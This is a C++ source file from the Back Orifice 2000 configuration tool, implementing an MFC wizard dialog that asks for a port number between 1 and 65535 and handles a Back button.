/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

// Wizard4.cpp : implementation file
//

#include "stdafx.h"
#include "bo2kcfg.h"
#include "Wizard4.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CWizard4 dialog


CWizard4::CWizard4(CWnd* pParent /*=NULL*/)
	: CDialog(CWizard4::IDD, pParent)
{
	//{{AFX_DATA_INIT(CWizard4)
	m_nPort = 0;
	//}}AFX_DATA_INIT
}


void CWizard4::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CWizard4)
	DDX_Text(pDX, IDC_PORT, m_nPort);
	DDV_MinMaxInt(pDX, m_nPort, 1, 65535);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CWizard4, CDialog)
	//{{AFX_MSG_MAP(CWizard4)
	ON_BN_CLICKED(IDBACK, OnBack)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CWizard4 message handlers

void CWizard4::OnBack() 
{
	EndDialog(IDBACK);	
}
